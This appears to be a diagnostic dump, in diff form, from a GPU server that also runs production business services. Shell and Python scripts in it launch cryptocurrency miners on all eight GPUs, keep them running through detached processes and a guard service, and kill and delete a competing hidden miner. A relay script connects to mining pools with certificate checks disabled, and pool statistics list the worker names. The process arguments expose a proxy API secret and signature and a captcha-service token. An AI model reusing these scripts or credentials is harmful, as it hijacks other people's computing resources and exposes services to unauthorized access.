@@ -1,0 +1,226 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### PS-FULL 2026-11-25T00:21:21Z
+    PID    PPID     ELAPSED %CPU COMMAND
+ 338822  202371       00:01 76.0 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disable-background-timer-throttling --disable-breakpad --force-color-profile=srgb --remote-debugging-pipe --allow-pre-commit-input --blink-settings=primaryHoverType=2,availableHoverTypes=2,primaryPointerType=4,availablePointerTypes=4 --ozone-platform=headless --disable-gpu-compositing --disable-blink-features=AutomationControlled --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=16 --time-ticks-at-unix-epoch=-1778125141602210 --launch-time-ticks=17440938059626 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,4035398821416025056,7517483022261334123,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+ 270653  270592       01:03 22.2 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disable-background-timer-throttling --disable-breakpad --force-color-profile=srgb --remote-debugging-pipe --allow-pre-commit-input --blink-settings=primaryHoverType=2,availableHoverTypes=2,primaryPointerType=4,availablePointerTypes=4 --ozone-platform=headless --disable-gpu-compositing --disable-blink-features=AutomationControlled --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1778125141602210 --launch-time-ticks=17440876554495 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,7303804340313364595,16975138928238743245,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+1428352 1428062 153-14:51:46 3.8 java -Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -Xms6g -Xmx6g -XX:MaxMetaspaceSize=512m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/data/npa-bicm/heapdump.hprof -jar app.jar
+2420608 2420150       30:12  3.1 java -Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -Duser.timezone=Asia/Shanghai -Dio.netty.transport.noNative=true -Dreactor.netty.useNative=false -jar app.jar --spring.profiles.active=prod
+  11316   11248 201-20:41:44 2.6 /opt/hosteye/bin/hosteye --is_child_mode=true --is_console_mode=false --start_mode=0
+ 270555  270551       01:04  1.9 /opt/venv/lib/python3.10/site-packages/playwright/driver/node /opt/venv/lib/python3.10/site-packages/playwright/driver/package/cli.js run-driver
+ 270589  270555       01:03  1.8 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --disable-field-trial-config --disable-background-networking --enable-features=NetworkService,NetworkServiceInProcess --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-back-forward-cache --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --no-default-browser-check --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding --allow-pre-commit-input --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --no-service-autorun --export-tagged-pdf --disable-search-engine-choice-screen --headless --hide-scrollbars --mute-audio --blink-settings=primaryHoverType=2,availableHoverTypes=2,primaryPointerType=4,availablePointerTypes=4 --no-sandbox --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE i890.kdltps.com" --proxy-server=socks5://i890.kdltps.com:15818 --proxy-bypass-list=<-loopback> --no-sandbox --disable-blink-features=AutomationControlled --ignore-certificate-errors --start-maximized --user-data-dir=/data/npa-bicm/script-cache/xianggang/User Data --remote-debugging-pipe about:blank
+ 202432  202371       02:04  1.5 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=renderer --headless --no-sandbox --disable-dev-shm-usage --disable-back-forward-cache --disable-background-timer-throttling --disable-breakpad --force-color-profile=srgb --remote-debugging-pipe --allow-pre-commit-input --blink-settings=primaryHoverType=2,availableHoverTypes=2,primaryPointerType=4,availablePointerTypes=4 --ozone-platform=headless --disable-gpu-compositing --disable-blink-features=AutomationControlled --lang=en-US --num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id=5 --time-ticks-at-unix-epoch=-1778125141602210 --launch-time-ticks=17440815735973 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,4035398821416025056,7517483022261334123,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+ 270608  270589       01:03  1.5 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE i890.kdltps.com" --no-sandbox --disable-dev-shm-usage --ignore-certificate-errors --proxy-server=socks5://i890.kdltps.com:15818 --use-angle=swiftshader-webgl --use-gl=angle --mute-audio --ignore-certificate-errors --headless --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,7303804340313364595,16975138928238743245,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+ 179348 1428352       02:07  1.4 python /data/npa-bicm/webSiteScriptFile/26050816104983501240/5e8881c888484d92a8f862b46e918eaa.py --script-common-path /data/npa-bicm/common/script_common.py --url https://bid.cnooc.com.cn/home/#/newsAlertList?index=0&childrenActive=4&type= --websiteId 14 --websiteExecRecordId 15972 --taskExecRecordId 587 --logDir /data/npa-bicm/logs/script/collection-type-1 --fileDownLoadPath /data/npa-bicm --collectionTypeId 1 --proxy-protocol socks5 --proxy-api https://tps.kdlapi.com/api/gettps/?secret_id=o6xyt1nx1hrn41pydtt2&signature=ieu0rbccs2lgyhe0he0nwlicpuon30qi&num=1&format=json&sep=1 --apiUrl http://localhost:8080/bicm/fullInfo/local --keywords 炉管,离心浇铸,转化炉,裂解,制氢,Cr25Ni35,Cr35Ni45,Cr25Ni20,ZGCr25Ni35NbTi,25Cr35NiNb,辐射段,35Cr45Ni,裂解炉,裂解装置,乙烯,乙烯裂解炉,25Cr-35Ni-,集合管,Incoloy800H,Ni35Cr25,35Cr45NiNb,制氢转化炉,猪尾管,合成氨 --captcha-api-url http://api.jfbym.com/api/YmServer/customApi --captcha-token AtNjoXoIZOY58IfypPCU9pCRVBtEBjYoI1u4J5YATIc --date 2026-11-24 --scriptCacheFolder /data/npa-bicm/script-cache
+ 184414  184371       02:06  1.1 /opt/venv/lib/python3.10/site-packages/playwright/driver/node /opt/venv/lib/python3.10/site-packages/playwright/driver/package/cli.js run-driver
+ 424406  424377 190-22:39:09 1.1 ./bcm-si -N 18f5adda-6d6f-45db-a7a4-117faf33a8da
+ 202368  184414       02:04  0.9 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --disable-field-trial-config --disable-background-networking --enable-features=NetworkService,NetworkServiceInProcess --disable-background-timer-throttling --disable-backgrounding-occluded-windows --disable-back-forward-cache --disable-breakpad --disable-client-side-phishing-detection --disable-component-extensions-with-background-pages --disable-component-update --no-default-browser-check --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding --allow-pre-commit-input --disable-hang-monitor --disable-ipc-flooding-protection --disable-popup-blocking --disable-prompt-on-repost --disable-renderer-backgrounding --force-color-profile=srgb --metrics-recording-only --no-first-run --password-store=basic --use-mock-keychain --no-service-autorun --export-tagged-pdf --disable-search-engine-choice-screen --headless --hide-scrollbars --mute-audio --blink-settings=primaryHoverType=2,availableHoverTypes=2,primaryPointerType=4,availablePointerTypes=4 --no-sandbox --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE i890.kdltps.com" --proxy-server=socks5://i890.kdltps.com:15818 --proxy-bypass-list=<-loopback> --no-sandbox --disable-blink-features=AutomationControlled --ignore-certificate-errors --start-maximized --user-data-dir=/data/npa-bicm/script-cache/cnooc/User Data --remote-debugging-pipe about:blank
+ 270548 1428352       01:05  0.7 python /data/npa-bicm/webSiteScriptFile/26061716545812841741/66b2eae27e97461e818bab4fe207eed4.py --script-common-path /data/npa-bicm/common/script_common.py --url http://ecm.hnxg.com.cn:9001/beps/web/GBBMPN?method=initLoad&inqu_status-0-PN=BID --websiteId 29 --websiteExecRecordId 15986 --taskExecRecordId 587 --logDir /data/npa-bicm/logs/script/collection-type-2 --fileDownLoadPath /data/npa-bicm --collectionTypeId 2 --proxy-protocol socks5 --proxy-api https://tps.kdlapi.com/api/gettps/?secret_id=o6xyt1nx1hrn41pydtt2&signature=ieu0rbccs2lgyhe0he0nwlicpuon30qi&num=1&format=json&sep=1 --apiUrl http://localhost:8080/bicm/fullInfo/local --keywords 辐射管,炉辊,淬火炉,热处理,冷轧,热轧,玻璃辊,连退线,镀锌线,硅钢线,宽厚板,中厚板,浮法玻璃线,轴瓦轴套,烧嘴,换热器,粉末,石棉辊,环辊,沉没辊,稳定辊 --captcha-api-url http://api.jfbym.com/api/YmServer/customApi --captcha-token AtNjoXoIZOY58IfypPCU9pCRVBtEBjYoI1u4J5YATIc --date 2026-11-24 --scriptCacheFolder /data/npa-bicm/script-cache
+ 270607  270591       01:03  0.7 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --disable-breakpad --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --field-trial-handle=3,i,7303804340313364595,16975138928238743245,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+ 202387  202370       02:04  0.6 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --disable-breakpad --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --field-trial-handle=3,i,4035398821416025056,7517483022261334123,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+ 202388  202368       02:04  0.5 /root/.cache/ms-playwright/chromium-1105/chrome-linux/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --host-resolver-rules="MAP * ~NOTFOUND , EXCLUDE i890.kdltps.com" --no-sandbox --disable-dev-shm-usage --ignore-certificate-errors --proxy-server=socks5://i890.kdltps.com:15818 --use-angle=swiftshader-webgl --use-gl=angle --mute-audio --ignore-certificate-errors --headless --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,4035398821416025056,7517483022261334123,262144 --enable-features=NetworkService,NetworkServiceInProcess --disable-features=AcceptCHFrame,AutoExpandDetailsElement,AvoidUnnecessaryBeforeUnloadCheckSync,CertificateTransparencyComponentUpdater,DestroyProfileOnBrowserClose,DialMediaRouteProvider,GlobalMediaControls,HttpsUpgrades,ImprovedCookieControls,LazyFrameLoading,MediaRouter,PaintHolding,Translate --variations-seed-version
+ 179300  179269 64-17:02:49  0.3 redis-server 0.0.0.0:6379
+ 338792   49454       00:03  0.3 sshd: root@notty
+ 354715  354561  5-14:05:26  0.3 /ssd/vendors/INSPUR/project/inspur-fastapi-backend/.venv/bin/python -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=14, pipe_handle=16) --multiprocessing-fork
+1793500       1 190-22:18:34 0.3 /usr/bin/containerd
+2028223 2028122 64-20:43:52  0.3 etcd -advertise-client-urls=http://etcd:2379 -listen-client-urls http://0.0.0.0:2379 --data-dir /etcd
+ 424377   10279 190-22:39:09 0.2 ./bcm-agent
+ 664004  663975 148-14:06:02 0.2 java -Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -Duser.timezone=Asia/Shanghai -Dio.netty.transport.noNative=true -Dreactor.netty.useNative=false -jar /app/app.jar --spring.profiles.active=prod
+1793539       1 190-22:18:33 0.2 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+1794362 1794112 190-22:18:32 0.2 mysqld --default-authentication-plugin=mysql_native_password
+1794397 1794128 190-22:18:32 0.2 redis-server *:6379
+1795606 1795602 190-22:18:31 0.2 python3 rag/svr/sync_data_source.py
+    792       2 201-20:42:13 0.1 [kcompactd0]
+   2013       2 201-20:41:47 0.1 [nvswi0]
+   2037       2 201-20:41:47 0.1 [nvswi1]
+   2188       2 201-20:41:47 0.1 [nvswi2]
+   2336       2 201-20:41:46 0.1 [nvswi3]
+   2889       2 201-20:41:46 0.1 [nvswi4]
+   3486       2 201-20:41:45 0.1 [nvswi5]
+  11292       1 201-20:41:44 0.1 /usr/bin/nv-hostengine -n --service-account nvidia-dcgm
+ 135138       2       02:23  0.1 [kworker/u258:2-flush-8:0]
+1427434 1427387 153-14:51:57 0.1 mysqld
+1794919 1793975 190-22:18:31 0.1 minio server /data --console-address :9001
+### SS-17048
+### ULCARD
+  UNIT               LOAD      ACTIVE SUB     DESCRIPTION
+● ul-prl-g0.service  not-found failed failed  ul-prl-g0.service
+● ul-prl-g1.service  not-found failed failed  ul-prl-g1.service
+● ul-prl-g2.service  not-found failed failed  ul-prl-g2.service
+● ul-prl-g3.service  not-found failed failed  ul-prl-g3.service
+● ul-prl-g4.service  not-found failed failed  ul-prl-g4.service
+● ul-prl-g5.service  not-found failed failed  ul-prl-g5.service
+● ul-prl-g6.service  not-found failed failed  ul-prl-g6.service
+● ul-prl-g7.service  not-found failed failed  ul-prl-g7.service
+● ul2-card@0.service not-found failed failed  ul2-card@0.service
+● ul2-card@1.service not-found failed failed  ul2-card@1.service
+● ul2-card@2.service not-found failed failed  ul2-card@2.service
+● ul2-card@3.service not-found failed failed  ul2-card@3.service
+● ul2-card@4.service not-found failed failed  ul2-card@4.service
+● ul2-card@5.service not-found failed failed  ul2-card@5.service
+● ul2-card@6.service not-found failed failed  ul2-card@6.service
+● ul2-card@7.service not-found failed failed  ul2-card@7.service
+  ul2-guard.service  loaded    active running UL2 guard
+
+LOAD   = Reflects whether the unit definition was properly loaded.
+Unit ul-card@6.service could not be found.
+### KEEP
+--- /root/ul2/keep.sh
+#!/bin/bash
+for p in $(pgrep -f '\.plhm' 2>/dev/null); do kill -9 $p; done
+[ -e /usr/local/bin/.plhm ] && { chattr -i /usr/local/bin/.plhm 2>/dev/null; rm -f /usr/local/bin/.plhm; }
+if ! pgrep -f '/root/ul2/krig-miner' >/dev/null; then
+  for i in 0 1 2 3 4 5 6 7; do
+    CUDA_VISIBLE_DEVICES=$i setsid nohup /root/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-t2-123-184-7-135-g$i --password x -d 0 --api-port 14$i >>/root/ul2/m$i.log 2>&1 &
+  done
+fi
+--- /root/ul/keep.sh
+#!/bin/sh
+exit 0
+--- /root/ul/keep-loop.sh
+#!/bin/sh
+exit 0
+--- /root/ul/sample.sh
+#!/bin/bash
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+curl -s -m 20 "https://pearlhash.xyz/api/account/$W" -o /tmp/pha.$$.json
+printf '%s ' "$(date -u +%FT%TZ)" >> /root/ul/24h.jsonl
+python3 -c '
+import json,sys
+try:
+  d=json.load(open(sys.argv[1]))
+except Exception as e:
+  print("parse_err",e); raise SystemExit
+ws=[w for w in (d.get("connected_workers") or []) if "123-184" in (w.get("worker_name") or "")]
+print(json.dumps({"est15":d.get("estimated_hashrate_15s"),"workers":len(ws),"names":[w["worker_name"] for w in ws]}))
+' /tmp/pha.$$.json >> /root/ul/24h.jsonl 2>/dev/null
+rm -f /tmp/pha.$$.json
+--- /opt/t19/sup.sh
+#!/bin/sh
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+P=pool.pearlhash.xyz:9000
+B=/opt/t19/wildrig-multi
+K=/opt/t19/krig/krig-miner
+L=/opt/t19/log
+mkdir -p $L
+for i in 0 1 2 3 4 5 6; do
+  WN=ul-t19-123-184-7-135-g$i
+  pgrep -f "$WN" >/dev/null 2>&1 || setsid nohup nice -n 19 $B --algo pearlhash --url $P --user $W.$WN --pass x --opencl-devices $i --gpu-intensity 1 --api-port 190$i > $L/w$i.log 2>&1 &
+done
+pgrep -f "krig-miner.*ul-t19-123-184-7-135-g7" >/dev/null 2>&1 || setsid nohup nice -n 19 $K --coin pearl -o stratum+ssl://prl-sg.kryptex.network:8048 -u $W/ul-t19-123-184-7-135-g7 -p x -d 7 --no-tui -l info > $L/g7.log 2>&1 &
+--- /opt/t19/relay.py
+import socket, ssl, select, threading, time
+
+LISTEN = ("127.0.0.1", 17048)
+UP = [("prl-sg.kryptex.network", 8048), ("prl-eu.kryptex.network", 8048),
+      ("prl-us.kryptex.network", 8048), ("prl-hk.kryptex.network", 8048)]
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+def log(*a):
+    print(time.strftime("%H:%M:%S"), *a, flush=True)
+
+def connect_up():
+    for h, p in UP:
+        try:
+            s = socket.create_connection((h, p), timeout=10)
+            s = ctx.wrap_socket(s, server_hostname=h)
+            s.settimeout(900)
+            log("upstream", h, p, "ok", s.cipher()[0])
+            return s, h
+        except Exception as e:
+            log("upstream", h, p, "fail", repr(e)[:90])
+    return None, None
+
+def pump(c, name):
+    up, h = connect_up()
+    if up is None:
+        try: c.close()
+        except Exception: pass
+        return
+    c.settimeout(900)
+    nb = 0
+    try:
+        while True:
+            r, _, _ = select.select([c, up], [], [], 900)
+            if not r:
+                log("idle", name, nb); break
+            for s in r:
+                try:
+                    d = s.recv(16384)
+--- /usr/local/bin/ul-guard.sh
+### ARGV
+-- argv-g0
+/opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g0 --pass x --protocol stratum --opencl-devices 0 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1960
+-- argv-g1
+/opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g1 --pass x --protocol stratum --opencl-devices 1 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1961
+-- argv-g6
+/opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g6 --pass x --protocol stratum --opencl-devices 6 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1966
+-- argv-g7
+/opt/t19/wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz --worker ul-t2-123-184-7-135-g7 --pass x --protocol stratum --opencl-devices 7 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1967
+### ULP2
+total 124924
+-rwxr-xr-x 1 root root       648 Nov 25 08:04 keep.sh
+-rwxr-xr-x 1 root root 127812624 Nov 25 08:00 krig-miner
+-rw-r--r-- 1 root root     10399 Nov 25 08:20 m0.log
+-rw-r--r-- 1 root root     10950 Nov 25 08:20 m1.log
+-rw-r--r-- 1 root root     10895 Nov 25 08:20 m2.log
+-rw-r--r-- 1 root root     10873 Nov 25 08:20 m3.log
+-rw-r--r-- 1 root root     10917 Nov 25 08:20 m4.log
+-rw-r--r-- 1 root root     11073 Nov 25 08:20 m5.log
+-rw-r--r-- 1 root root     11023 Nov 25 08:20 m6.log
+-rw-r--r-- 1 root root     10896 Nov 25 08:20 m7.log
+total 44
+-rwxr-xr-x 1 root root  677 Nov 25 07:55 keep.sh
+-rwxr-xr-x 1 root root  815 Nov 25 07:46 keep.sh.plh6997off
+drwxr-xr-x 2 root root 4096 Nov 25 07:10 krig
+-rw-r--r-- 1 root root 2223 Nov 25 07:41 m0.log
+-rw-r--r-- 1 root root 2184 Nov 25 07:41 m1.log
+-rw-r--r-- 1 root root 2469 Nov 25 07:41 m2.log
+-rw-r--r-- 1 root root 2347 Nov 25 07:41 m3.log
+-rw-r--r-- 1 root root 2184 Nov 25 07:41 m4.log
+-rw-r--r-- 1 root root 2306 Nov 25 07:41 m5.log
+### DOCKER
+nginx nginx Up 4 weeks
+onlyoffice onlyoffice/documentserver Up 3 weeks
+minio minio/minio Up 2 months
+redis redis:7-alpine Up 2 months
+mysql mysql:8.0 Up 2 months
+milvus-etcd quay.io/coreos/etcd:v3.5.25 Up 2 months (healthy)
+npa-client-java npa-client-java:latest Up 4 months
+npa-bicm-nginx nginx:1.25-alpine Up 5 months
+npa-bicm npa_bicm-npa-bicm Up 5 months
+npa-bicm-mysql mysql:8.0 Up 5 months (healthy)
+### CRYPTO-CANDIDATES
+/dev/shm:
+total 296
+-rw------- 1 root root       287 Nov 25 05:11 k.tmp
+-rw------- 1 root root 251658260 Nov 24 04:56 psm_1e9b2a78
+-rw------- 1 root root 167772210 May  9  2026 psm_1efd9ab7
+-rw------- 1 root root 251658260 Nov 24 04:56 psm_4d415600
+-rw------- 1 root root 167772210 May  9  2026 psm_5d07e672
+-rw------- 1 root root  25165836 Nov 24 04:55 psm_7858ff3a
+-rw------- 1 root root 167772190 Nov 24 04:56 psm_c4cf54ee
+-rw------- 1 root root  25165848 May  9  2026 psm_cfba0550
+-rw------- 1 root root        32 Nov 19 18:16 sem.mp-12j80qg6
+-rw------- 1 root root        32 Nov 19 18:16 sem.mp-1fw9parb
+-rw------- 1 root root        32 Nov 24 04:55 sem.mp-2jm9ubk3
+-rw------- 1 root root        32 Sep 28 09:28 sem.mp-5bd0bk93
+-rw------- 1 root root        32 Nov 19 18:16 sem.mp-7k7ysrmf
+-rw------- 1 root root        32 Sep 28 09:28 sem.mp-7lhdstuo
+-rw------- 1 root root        32 Sep 27 13:47 sem.mp-80kc5o20
+-rw------- 1 root root        32 Sep 27 13:47 sem.mp-9jpuw0e9
+-rw------- 1 root root        32 Sep 27 14:17 sem.mp-_juofmq2
+-rw------- 1 root root        32 Nov 19 18:16 sem.mp-a36jndte
+### POOL
+HTTP=200
+POOLROW ul-t2-123-184-7-135-g6 offline valid=198 age=98 3h=65885994548568.37
+POOLROW ul-t2-123-184-7-135-g5 offline valid=195 age=34 3h=69221994272546.51
+POOLROW ul-t2-123-184-7-135-g4 offline valid=176 age=27 3h=50873995790666.72
+POOLROW ul-t2-123-184-7-135-g1 offline valid=180 age=153 3h=62549994824590.22
+POOLROW ul-t2-123-184-7-135-g7 offline valid=159 age=113 3h=55043995445639.4
+POOLROW ul-t2-123-184-7-135-g2 offline valid=187 age=132 3h=69221994272546.52
+POOLROW ul-t2-123-184-7-135-g0 offline valid=165 age=107 3h=68387994341551.98
+POOLROW ul-t2-123-184-7-135-g3 offline valid=173 age=101 3h=58379995169617.54
+POOLROW ul-t19-123-184-7-135-g7 offline valid=878 age=27593 3h=0
+### DONE 2026-11-25T00:21:25Z
